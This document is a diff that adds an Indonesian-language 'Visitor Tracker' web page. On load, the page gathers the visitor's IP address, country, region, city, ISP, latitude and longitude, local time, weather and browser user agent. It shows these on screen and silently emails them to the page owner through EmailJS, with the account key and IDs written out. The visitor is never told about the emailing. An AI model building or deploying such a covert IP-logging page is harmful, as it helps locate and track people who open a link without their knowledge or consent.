@@ -1,0 +1,53 @@
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+ <meta charset="UTF-8" />
+ <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+ <title>Visitor Tracker</title>
+ <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+ <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+ <script>
+ (function(){
+ emailjs.init("0qs18FOWQ7oRo552e");
+ })();
+ </script>
+</head>
+<body class="bg-gradient-to-br from-blue-100 to-white min-h-screen flex items-center justify-center">
+ <div class="bg-white shadow-xl rounded-2xl p-6 w-full max-w-md text-center">
+ <h1 class="text-2xl font-bold text-blue-600 mb-4">Info Pengunjung</h1>
+ <div id="info" class="space-y-2 text-left text-gray-700 text-sm"></div>
+ </div>
+
+ <script>
+ async function getInfo() {
+ const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
+ const weatherData = await fetch(`https://api.open-meteo.com/v1/forecast?latitude=${ipData.latitude}&longitude=${ipData.longitude}&current_weather=true`).then(res => res.json());
+ const waktu = new Date().toLocaleString("id-ID", { timeZone: ipData.timezone });
+
+ const data = {
+ ip: ipData.ip,
+ negara: ipData.country_name,
+ provinsi: ipData.region,
+ kota: ipData.city,
+ kecamatan: ipData.org || "-",
+ waktu,
+ cuaca: `${weatherData.current_weather.temperature}°C, ${weatherData.current_weather.weathercode}`,
+ merek: navigator.userAgent,
+ lokasi: `${ipData.latitude}, ${ipData.longitude}`
+ };
+
+ const container = document.getElementById('info');
+ for (let key in data) {
+ container.innerHTML += `<p><strong>${key.toUpperCase()}:</strong> ${data[key]}</p>`;
+ }
+
+ emailjs.send("service_dma4o9b", "template_8rh6wat", data)
+ .then(() => console.log("Email terkirim"))
+ .catch(err => console.error("Gagal kirim email:", err));
+ }
+
+ getInfo();
+ </script>
+</body>
+</html>
